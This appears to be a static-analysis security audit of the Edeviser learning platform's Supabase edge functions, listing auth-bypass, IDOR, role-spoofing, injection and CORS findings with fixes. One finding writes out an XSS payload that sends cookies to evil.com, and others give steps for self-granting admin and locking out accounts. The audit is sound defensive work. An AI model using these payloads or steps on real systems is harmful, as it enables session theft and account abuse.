# Security Audit Report — Edeviser Platform

**Date:** 2026-03-28
**Scope:** Auth bypass, data leakage, privilege escalation, injection points
**Method:** Static analysis of all edge functions, auth flows, frontend routing, and shared utilities

---

## Executive Summary

| Severity | Count |
| -------- | ----- |
| CRITICAL | 3     |
| HIGH     | 4     |
| MEDIUM   | 5     |
| LOW      | 3     |

The most dangerous class of bug is **substring-based service-role key matching** (`authHeader.includes(serviceRoleKey)`) present in **13 edge functions** and the shared `_shared/auth.ts`. This pattern allows any user who can observe or guess part of the key to craft a header that passes the check. Combined with missing ownership verification in `check-badges` and `process-streak`, any authenticated student can manipulate another student's gamification data.

---

## CRITICAL Findings

### VULN-01: Substring Auth Bypass in 13 Edge Functions

**Severity:** CRITICAL
**Category:** Auth Bypass
**CVSS estimate:** 9.1

**Affected files (all use the same pattern):**

| File                                                      | Line |
| --------------------------------------------------------- | ---- |
| `supabase/functions/_shared/auth.ts`                      | 58   |
| `supabase/functions/award-xp/index.ts`                    | 223  |
| `supabase/functions/process-streak/index.ts`              | 131  |
| `supabase/functions/check-badges/index.ts`                | 644  |
| `supabase/functions/calculate-attainment-rollup/index.ts` | 48   |
| `supabase/functions/send-email-notification/index.ts`     | 238  |
| `supabase/functions/check-login-rate/index.ts`            | 218  |
| `supabase/functions/weekly-summary-cron/index.ts`         | 24   |
| `supabase/functions/compute-habit-correlations/index.ts`  | 211  |
| `supabase/functions/update-question-analytics/index.ts`   | 236  |
| `supabase/functions/streak-risk-cron/index.ts`            | 24   |
| `supabase/functions/compute-at-risk-signals/index.ts`     | 97   |
| `supabase/functions/ai-module-suggestion/index.ts`        | 212  |
| `supabase/functions/ai-at-risk-prediction/index.ts`       | 173  |

**Vulnerable code pattern:**

```typescript
// supabase/functions/process-streak/index.ts:131
const isServiceRole = serviceRoleKey && authHeader.includes(serviceRoleKey);
```

**Attack path:**

1. Attacker obtains a valid JWT for any authenticated user.
2. Attacker crafts an Authorization header that embeds the service role key as a substring:
   ```
   Authorization: Bearer eyJhbGc...<normal_jwt>...<SERVICE_ROLE_KEY_FRAGMENT>
   ```
3. Because `String.includes()` is a substring search, even a partial match within the full header string can pass. More critically, if the full service-role key leaks (via logs, error messages, `.env` mis-deploy), the attacker sends:
   ```
   Authorization: Bearer <service_role_key>
   ```
   This passes `authHeader.includes(serviceRoleKey)` and grants god-mode access to every protected function.

**Why this is worse than it appears:** The Supabase service role key is a base64-encoded JWT. The `authHeader` value is typically `Bearer <token>`. The `includes()` call searches the _entire_ header string, not just the token portion. A crafted header like `Bearer <key>` trivially matches.

**Proposed fix — all 13 files + `_shared/auth.ts`:**

```typescript
// BEFORE (vulnerable):
const isServiceRole = serviceRoleKey && authHeader.includes(serviceRoleKey);

// AFTER (strict equality on extracted Bearer token):
const bearerToken = authHeader.startsWith("Bearer ")
  ? authHeader.slice(7).trim()
  : "";
const isServiceRole = serviceRoleKey !== "" && bearerToken === serviceRoleKey;
```

---

### VULN-02: IDOR in `check-badges` — Any User Can Trigger Badges for Any Student

**Severity:** CRITICAL
**Category:** Privilege Escalation / IDOR
**File:** `supabase/functions/check-badges/index.ts`
**Lines:** 641-682

**Vulnerable code:**

```typescript
// Line 646-665: Auth only checks "is caller authenticated?" — not "does caller own student_id?"
if (!isServiceRole) {
  // ...
  const {
    data: { user: caller },
    error: authError,
  } = await userClient.auth.getUser();
  if (authError || !caller) {
    return new Response(JSON.stringify({ error: "Unauthorized" }), {
      status: 401,
    });
  }
  // ❌ NO role check
  // ❌ NO ownership check (caller.id !== student_id)
}

// Line 682: student_id comes from the request body — attacker-controlled
const { student_id, trigger } = validation.data;
```

**Attack path:**

1. Student A authenticates normally (gets a valid JWT).
2. Student A calls `POST /check-badges` with body:
   ```json
   { "student_id": "<student_B_uuid>", "trigger": "submission" }
   ```
3. The function queries Student B's data with a service-role client (bypassing RLS) and can award badges + XP to Student B.
4. Repeat with different triggers to award badges Student B hasn't earned.

**Impact:** Complete compromise of the badge/XP gamification system. Any student can award badges to any other student, corrupting leaderboards and achievements.

**Proposed fix:**

```typescript
if (!isServiceRole) {
  const {
    data: { user: caller },
    error: authError,
  } = await userClient.auth.getUser();
  if (authError || !caller) {
    return new Response(JSON.stringify({ error: "Unauthorized" }), {
      status: 401,
    });
  }
  // Enforce ownership: only the student themselves or a teacher/admin can trigger
  const callerRole = caller.app_metadata?.role ?? "";
  if (caller.id !== student_id && !["teacher", "admin"].includes(callerRole)) {
    return new Response(
      JSON.stringify({
        error: "Forbidden: cannot check badges for another student",
      }),
      { status: 403 }
    );
  }
}
```

---

### VULN-03: IDOR in `process-streak` — Any User Can Manipulate Any Student's Streak

**Severity:** CRITICAL
**Category:** Privilege Escalation / IDOR
**File:** `supabase/functions/process-streak/index.ts`
**Lines:** 128-169

**Vulnerable code:**

```typescript
// Line 133-151: Same pattern — checks "authenticated?" but not "owns student_id?"
if (!isServiceRole) {
  // ...
  const {
    data: { user: caller },
    error: authError,
  } = await userClient.auth.getUser();
  if (authError || !caller) {
    return new Response(JSON.stringify({ error: "Unauthorized" }), {
      status: 401,
    });
  }
  // ❌ NO caller.id === student_id check
}

// Line 169: student_id from request body
const { student_id } = validation.data;
```

**Attack path:**

1. Student A calls `POST /process-streak` with `{ "student_id": "<student_B_uuid>" }`.
2. The function processes a login-streak update for Student B using a service-role client.
3. This can reset/increment Student B's streak, consume their streak freezes, or trigger milestone XP awards.

**Proposed fix:**

```typescript
if (!isServiceRole) {
  const {
    data: { user: caller },
  } = await userClient.auth.getUser();
  if (!caller || caller.id !== student_id) {
    return new Response(JSON.stringify({ error: "Forbidden" }), {
      status: 403,
    });
  }
}
```

---

## HIGH Findings

### VULN-04: Role Spoofing via `user_metadata` in Multiple Edge Functions

**Severity:** HIGH
**Category:** Privilege Escalation
**Affected files:**

| File                                                      | Line    | Role Check                                    |
| --------------------------------------------------------- | ------- | --------------------------------------------- |
| `supabase/functions/send-email-notification/index.ts`     | 253     | `role !== 'admin'`                            |
| `supabase/functions/calculate-attainment-rollup/index.ts` | 69-70   | `!['teacher', 'admin'].includes(callerRole)`  |
| `supabase/functions/check-login-rate/index.ts`            | 233-234 | `role !== 'admin'`                            |
| `supabase/functions/_shared/auth.ts`                      | 34      | Returns `user_metadata.role` as authoritative |

**Vulnerable code pattern:**

```typescript
// send-email-notification/index.ts:253
const role = user.app_metadata?.role ?? user.user_metadata?.role ?? "";
if (role !== "admin") {
  /* reject */
}
```

**Attack path:**

By default, Supabase allows authenticated users to update their own `user_metadata` via `supabase.auth.updateUser({ data: { role: 'admin' } })`. The fallback chain `app_metadata?.role ?? user_metadata?.role` means if `app_metadata.role` is unset (e.g., for newly created users or if the admin forgot to set it), the user-controlled `user_metadata.role` is trusted.

1. Attacker calls `supabase.auth.updateUser({ data: { role: 'admin' } })` from the browser console.
2. Now `user.user_metadata.role === 'admin'`.
3. Attacker calls `POST /send-email-notification` — passes the admin check.
4. Attacker can send arbitrary emails to any address using the platform's Resend account.

**Proposed fix — all affected files:**

```typescript
// NEVER trust user_metadata for authorization. Only use app_metadata (set server-side).
const callerRole = caller.app_metadata?.role ?? "";

// OR better: query the profiles table which is the source of truth
const { data: profile } = await supabase
  .from("profiles")
  .select("role")
  .eq("id", caller.id)
  .maybeSingle();
const callerRole = profile?.role ?? "";
```

---

### VULN-05: Unauthenticated `check` and `record_failure` in `check-login-rate`

**Severity:** HIGH
**Category:** Abuse / DoS
**File:** `supabase/functions/check-login-rate/index.ts`
**Lines:** 199-248

**Vulnerable code:**

```typescript
// Only the 'clear' action requires auth (line 215-238).
// 'check' and 'record_failure' are completely unauthenticated.
if (action === "clear") {
  // auth check here
}

switch (action) {
  case "check":
    return handleCheck(supabase, email); // ← no auth
  case "record_failure":
    return handleRecordFailure(supabase, email); // ← no auth
}
```

**Attack path:**

1. Attacker sends `POST /check-login-rate` with `{ "email": "victim@university.edu", "action": "record_failure" }` — 5 times.
2. The victim's account is now locked out for 15 minutes.
3. Repeat every 15 minutes to permanently deny access to any known email.
4. The `email` field only requires a non-empty string — no format validation — so attacker can also flood the `login_attempts` table with garbage.

**Impact:** Any unauthenticated attacker can lock out any user indefinitely.

**Proposed fix:**

```typescript
// Option A: Require a CAPTCHA token for record_failure
// Option B: Rate-limit the endpoint itself by IP (Supabase API Gateway or Cloudflare)
// Option C: Require the anon key + validate the email matches an active auth attempt

// At minimum, add IP-based rate limiting:
const clientIP = req.headers.get("x-forwarded-for") ?? "unknown";
// ... check if this IP has made > N requests in the last M seconds
```

---

### VULN-06: HTML Injection in Email Templates

**Severity:** HIGH
**Category:** Injection (Stored XSS via Email)
**File:** `supabase/functions/send-email-notification/index.ts`
**Lines:** 103-192

**Vulnerable code:**

```typescript
// Line 114: data.student_name is interpolated directly into HTML
html: `<p>Hi ${data.student_name ?? 'there'},</p>`

// Line 117: data.login_url is used as an href without sanitization
<a href="${data.login_url ?? '#'}">Log In Now</a>

// Line 144: data.assignment_title used in subject AND body
subject: `📝 New Assignment: ${data.assignment_title ?? 'Untitled'}`,
```

All 5 email templates (`streak_risk`, `weekly_summary`, `new_assignment`, `grade_released`, `bulk_import_invitation`) use raw string interpolation of user-controlled `data` fields.

**Attack path:**

1. An admin (or attacker who exploited VULN-04) calls the email function with:
   ```json
   {
     "to": "victim@example.com",
     "template": "streak_risk",
     "data": {
       "student_name": "<img src=x onerror='fetch(`https://evil.com?c=`+document.cookie)'>",
       "login_url": "javascript:alert(document.domain)"
     }
   }
   ```
2. The victim receives an email with injected HTML/JS.
3. Most modern email clients block JavaScript, but HTML injection still enables phishing (fake forms, credential harvesting links styled to look like the platform).

**Proposed fix:**

```typescript
function escapeHtml(value: unknown): string {
  const str = String(value ?? '');
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

function sanitizeUrl(url: unknown): string {
  const str = String(url ?? '#');
  if (str.startsWith('https://') || str.startsWith('http://')) return str;
  return '#';
}

// Then use in templates:
html: `<p>Hi ${escapeHtml(data.student_name)},</p>`
// ...
<a href="${sanitizeUrl(data.login_url)}">Log In Now</a>
```

---

### VULN-07: Health Endpoint Exposes DB Connectivity Without Auth

**Severity:** HIGH (information disclosure + abuse)
**Category:** Information Leakage
**File:** `supabase/functions/health/index.ts`
**Lines:** 15-70

**Vulnerable code:**

```typescript
serve(async (req) => {
  // No auth check whatsoever
  const supabase = createClient(
    Deno.env.get('SUPABASE_URL')!,
    Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!, // Uses service role!
  );

  // Line 29: Attempts to call an RPC function
  const { error } = await supabase.rpc('sql', { query: 'SELECT 1' }).maybeSingle();
```

**Attack path:**

1. Anyone can call `GET /health` without authentication.
2. The response reveals whether the database is reachable (`"database": "connected"` vs `"unreachable"`).
3. The function uses the **service role key** internally — if the RPC `sql` exists, it executes `SELECT 1` with full privileges.
4. Attacker can use this for reconnaissance (is the system up?) and as a cheap DoS amplifier (each call triggers a DB round-trip with service-role credentials).

**Proposed fix:**

```typescript
// Option A: Require a shared secret header
const healthSecret = req.headers.get("x-health-secret");
if (healthSecret !== Deno.env.get("HEALTH_CHECK_SECRET")) {
  return new Response("Forbidden", { status: 403 });
}

// Option B: Use anon key instead of service role for the health check
const supabase = createClient(
  Deno.env.get("SUPABASE_URL")!,
  Deno.env.get("SUPABASE_ANON_KEY")!
);
```

---

## MEDIUM Findings

### VULN-08: Wildcard CORS on All Edge Functions

**Severity:** MEDIUM
**Category:** Data Leakage (CORS misconfiguration)

**Affected:** Every edge function except `export-student-data` (which uses `ALLOWED_ORIGIN` env var).

**Vulnerable code (repeated in every file):**

```typescript
const corsHeaders = {
  "Access-Control-Allow-Origin": "*", // ← allows any origin
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type",
};
```

**Attack path:**

1. Attacker hosts a malicious page at `https://evil.com`.
2. If a logged-in Edeviser user visits the page, JavaScript on that page can call any Edeviser edge function using the user's cookies/stored auth.
3. Because `Access-Control-Allow-Origin: *`, the browser permits the cross-origin response to be read.

**Note:** `Access-Control-Allow-Origin: *` does NOT send cookies automatically, but Supabase auth uses `Authorization: Bearer <token>` headers. If the attacker can read the token from localStorage (e.g., via another XSS), the wildcard CORS makes cross-origin exploitation trivial.

**Proposed fix:**

```typescript
const ALLOWED_ORIGINS = (
  Deno.env.get("ALLOWED_ORIGINS") ?? "https://edeviser.vercel.app"
).split(",");

function getCorsHeaders(req: Request) {
  const origin = req.headers.get("Origin") ?? "";
  return {
    "Access-Control-Allow-Origin": ALLOWED_ORIGINS.includes(origin)
      ? origin
      : ALLOWED_ORIGINS[0],
    "Access-Control-Allow-Headers":
      "authorization, x-client-info, apikey, content-type",
    Vary: "Origin",
  };
}
```

---

### VULN-09: Error Messages Leak Internal Details

**Severity:** MEDIUM
**Category:** Information Leakage
**Affected files:**

| File                           | Line | Leaked Info                                  |
| ------------------------------ | ---- | -------------------------------------------- |
| `process-streak/index.ts`      | 183  | `fetchErr.message` (Supabase/Postgres error) |
| `check-badges/index.ts`        | 694  | `fetchErr.message`                           |
| `export-student-data/index.ts` | 69   | `(error as Error).message`                   |
| `check-login-rate/index.ts`    | 253  | `(error as Error).message`                   |

**Vulnerable code:**

```typescript
// export-student-data/index.ts:69
return new Response(JSON.stringify({ error: (error as Error).message }), {
  status: 500,
});
```

**Attack path:**

1. Attacker sends malformed payloads to trigger errors.
2. Error messages may reveal: table names, column names, constraint names, Postgres error codes, internal function names.
3. This information aids further exploitation (e.g., learning table structure for IDOR attacks).

**Proposed fix:**

```typescript
// Log the real error server-side, return a generic message to the client
console.error("Internal error:", (error as Error).message);
return new Response(JSON.stringify({ error: "Internal server error" }), {
  status: 500,
  headers: corsHeaders,
});
```

---

### VULN-10: `award-xp` Allows Negative XP Without Server-side Cap

**Severity:** MEDIUM
**Category:** Business Logic / Data Integrity
**File:** `supabase/functions/award-xp/index.ts`
**Lines:** 112-114

**Vulnerable code:**

```typescript
if (
  p.xp_amount === undefined ||
  p.xp_amount === null ||
  typeof p.xp_amount !== "number"
) {
  return { valid: false, error: "xp_amount is required and must be a number" };
}
// ❌ No range check — xp_amount can be negative, zero, or absurdly large
```

**Attack path:**

For self-triggered sources (`login`, `journal`), the server overrides the XP amount (line 228-231). But for the `submission` source (line 250-277), the XP is derived from assignment lookup. However, there's no cap on the `xp_amount` field in validation. If a service-role caller sends `xp_amount: 999999`, it's accepted.

**Proposed fix:**

```typescript
const MAX_XP_PER_AWARD = 1000; // reasonable upper bound
if (p.xp_amount < 0 || p.xp_amount > MAX_XP_PER_AWARD) {
  return {
    valid: false,
    error: `xp_amount must be between 0 and ${MAX_XP_PER_AWARD}`,
  };
}
```

---

### VULN-11: Offline Queue Payload Tampering

**Severity:** MEDIUM
**Category:** Data Integrity / Client-side Tampering
**File:** `src/lib/offlineQueue.ts`

**Vulnerable code:**

```typescript
// Line 15-16: Queue stored in plaintext localStorage
const raw = localStorage.getItem(QUEUE_KEY);
return raw ? JSON.parse(raw) : [];
```

**Attack path:**

1. User goes offline, queues actions (e.g., habit log, journal save).
2. Attacker (or malicious browser extension) modifies `localStorage['edeviser_offline_queue']`.
3. On reconnect, tampered payloads are flushed to the server.
4. If the server trusts these payloads (e.g., habit completion timestamps), the attacker can backdate entries or fabricate data.

**Proposed fix:**

```typescript
// Add HMAC integrity check using a session-derived key
import { createHmac } from "crypto";

function signQueue(queue: QueuedEvent[], secret: string): string {
  return createHmac("sha256", secret)
    .update(JSON.stringify(queue))
    .digest("hex");
}

// On save: store { events: [...], sig: signQueue(events, sessionKey) }
// On load: verify sig before processing
```

Alternatively, ensure all server-side handlers re-validate data and don't trust client-provided timestamps.

---

### VULN-12: Missing UUID Format Validation on IDs

**Severity:** MEDIUM
**Category:** Input Validation
**Affected:** All edge functions that accept `student_id`, `grade_id`, `submission_id` from request body.

**Example (`calculate-attainment-rollup/index.ts:86-91`):**

```typescript
const { grade_id, submission_id } = payload;
if (!grade_id || !submission_id) {
  return new Response(
    JSON.stringify({ error: "Missing grade_id or submission_id" }),
    { status: 400 }
  );
}
// ❌ No format validation — accepts any string
```

**Attack path:** While Supabase/Postgres will reject non-UUID values at the query level, the error messages returned may leak schema information. Proper validation prevents unnecessary DB round-trips and information disclosure.

**Proposed fix:**

```typescript
const UUID_RE =
  /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

function isValidUUID(value: unknown): value is string {
  return typeof value === "string" && UUID_RE.test(value);
}

if (!isValidUUID(grade_id) || !isValidUUID(submission_id)) {
  return new Response(JSON.stringify({ error: "Invalid ID format" }), {
    status: 400,
  });
}
```

---

## LOW Findings

### VULN-13: Frontend RouteGuard is Client-Side Only

**Severity:** LOW
**Category:** Defense in Depth
**File:** `src/router/RouteGuard.tsx`
**Lines:** 19-42

The `RouteGuard` component checks `role` from the `useAuth()` hook (sourced from Supabase session). This is a UI-only guard — it prevents navigation but doesn't prevent a knowledgeable attacker from calling Supabase APIs directly. This is acceptable **only if** RLS policies are correctly configured on every table.

**Recommendation:** Audit all RLS policies to ensure they enforce the same role restrictions as the frontend guards. The frontend guard is a UX convenience, not a security boundary.

---

### VULN-14: Sentry PII Scrubbing Doesn't Cover `breadcrumb.data`

**Severity:** LOW
**Category:** Data Leakage (Compliance)
**File:** `src/lib/sentry.ts`
**Lines:** 56-67

```typescript
beforeBreadcrumb(breadcrumb) {
  if (breadcrumb.message) {
    breadcrumb.message = scrubPII(breadcrumb.message);
  }
  // ❌ breadcrumb.data.from, breadcrumb.data.url, etc. are NOT scrubbed
  // Only strips query params from navigation breadcrumbs
}
```

**Impact:** XHR breadcrumbs may contain URLs with UUIDs (student IDs) in path segments, which are PII under FERPA. The current `scrubPII` regex does redact UUIDs in `breadcrumb.message`, but `breadcrumb.data` objects (which contain `url`, `method`, `status_code`) are not scrubbed.

**Proposed fix:**

```typescript
beforeBreadcrumb(breadcrumb) {
  if (breadcrumb.message) {
    breadcrumb.message = scrubPII(breadcrumb.message);
  }
  if (breadcrumb.data) {
    for (const key of Object.keys(breadcrumb.data)) {
      if (typeof breadcrumb.data[key] === 'string') {
        breadcrumb.data[key] = scrubPII(breadcrumb.data[key]);
      }
    }
  }
  return breadcrumb;
}
```

---

### VULN-15: `export-student-data` Creates Storage Bucket On-the-Fly

**Severity:** LOW
**Category:** Security Misconfiguration
**File:** `supabase/functions/export-student-data/index.ts`
**Lines:** 58-61

```typescript
const { error: uploadErr } = await supabase.storage.from('reports').upload(fileName, ...);
if (uploadErr) {
  // If bucket doesn't exist, create it — but with default settings
  await supabase.storage.createBucket('reports', { public: false }).catch(() => {});
  await supabase.storage.from('reports').upload(fileName, ...);
}
```

**Risk:** The bucket is created with `{ public: false }`, which is correct. However, there's no check for whether the first upload error was actually "bucket not found" vs. a permissions error. Also, the bucket is created without file size limits, MIME type restrictions, or retention policies.

**Proposed fix:** Pre-create the bucket via migration with explicit security settings. Remove runtime bucket creation.

---

## Positive Findings (Things Done Right)

1. **No SQL injection** — All database queries use the Supabase JS client with parameterized queries. No raw SQL string interpolation found.
2. **No `dangerouslySetInnerHTML`** — Zero instances in the React frontend. React's default XSS escaping is intact.
3. **`export-student-data` uses `user.id`** — The GDPR export function correctly derives `studentId` from the authenticated user's JWT, not from the request body. This prevents IDOR.
4. **Sentry PII scrubbing** — The `beforeSend` hook strips email, username, IP, and UUIDs from error events. `maskAllText`, `maskAllInputs`, `blockAllMedia` are enabled for session replays.
5. **`award-xp` has partial ownership check** — For non-service-role callers, it validates `user.id === student_id` and restricts to self-triggered sources only.
6. **`export-student-data` uses scoped CORS** — Unlike other functions, it reads `ALLOWED_ORIGIN` from env.

---

## Remediation Priority

### Immediate (fix before next deploy)

| ID      | Fix                                                                                           | Effort    |
| ------- | --------------------------------------------------------------------------------------------- | --------- |
| VULN-01 | Replace `includes()` with strict Bearer token equality in all 13 files + `_shared/auth.ts`    | 1-2 hours |
| VULN-02 | Add `caller.id === student_id` check in `check-badges`                                        | 15 min    |
| VULN-03 | Add `caller.id === student_id` check in `process-streak`                                      | 15 min    |
| VULN-04 | Remove `user_metadata` fallback from role checks; use `app_metadata` only or query `profiles` | 1 hour    |

### Short-term (within 1 week)

| ID      | Fix                                                                                 | Effort    |
| ------- | ----------------------------------------------------------------------------------- | --------- |
| VULN-05 | Add IP-based rate limiting or CAPTCHA to `check-login-rate` unauthenticated actions | 2-4 hours |
| VULN-06 | Add HTML escaping + URL sanitization to all email templates                         | 1-2 hours |
| VULN-07 | Protect health endpoint with a shared secret or switch to anon key                  | 30 min    |
| VULN-08 | Replace wildcard CORS with origin allowlist in all edge functions                   | 1-2 hours |
| VULN-09 | Replace leaked error messages with generic "Internal server error"                  | 1 hour    |

### Medium-term (within 1 month)

| ID      | Fix                                                                         | Effort    |
| ------- | --------------------------------------------------------------------------- | --------- |
| VULN-10 | Add XP amount range validation                                              | 30 min    |
| VULN-11 | Add HMAC integrity to offline queue OR re-validate all payloads server-side | 2-4 hours |
| VULN-12 | Add UUID format validation to all edge function inputs                      | 1-2 hours |
| VULN-13 | Audit all RLS policies for parity with frontend role guards                 | 4-8 hours |
| VULN-14 | Extend Sentry breadcrumb scrubbing to `data` fields                         | 30 min    |
| VULN-15 | Pre-create storage buckets via migration                                    | 30 min    |

---

## Appendix: Centralized Auth Helper Recommendation

Most vulnerabilities stem from each edge function implementing its own auth logic. A centralized helper would eliminate this duplication. The existing `_shared/auth.ts` is a good start but has the same `includes()` bug (line 58) and doesn't enforce ownership checks.

**Recommended pattern:**

```typescript
// supabase/functions/_shared/auth.ts (revised)

interface AuthContext {
  isServiceRole: boolean;
  userId: string | null;
  role: string; // from app_metadata only
}

export async function authenticate(
  req: Request
): Promise<AuthContext | Response> {
  const authHeader = req.headers.get("Authorization") ?? "";
  const serviceRoleKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? "";

  // Strict service-role check
  const bearerToken = authHeader.startsWith("Bearer ")
    ? authHeader.slice(7).trim()
    : "";
  if (serviceRoleKey && bearerToken === serviceRoleKey) {
    return { isServiceRole: true, userId: null, role: "service_role" };
  }

  // JWT user check
  if (!authHeader) {
    return new Response(JSON.stringify({ error: "Unauthorized" }), {
      status: 401,
    });
  }

  const userClient = createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_ANON_KEY")!,
    { global: { headers: { Authorization: authHeader } } }
  );
  const {
    data: { user },
    error,
  } = await userClient.auth.getUser();
  if (error || !user) {
    return new Response(JSON.stringify({ error: "Unauthorized" }), {
      status: 401,
    });
  }

  // Only trust app_metadata for role (server-set, not user-editable)
  const role = user.app_metadata?.role ?? "";

  return { isServiceRole: false, userId: user.id, role };
}

export function requireOwnership(
  auth: AuthContext,
  targetUserId: string
): Response | null {
  if (auth.isServiceRole) return null;
  if (auth.userId === targetUserId) return null;
  if (["teacher", "admin"].includes(auth.role)) return null;
  return new Response(JSON.stringify({ error: "Forbidden" }), { status: 403 });
}
```

Then each edge function becomes:

```typescript
const auth = await authenticate(req);
if (auth instanceof Response) return auth;

const ownershipCheck = requireOwnership(auth, student_id);
if (ownershipCheck) return ownershipCheck;
```

This eliminates the entire class of VULN-01 through VULN-04 in one refactor.
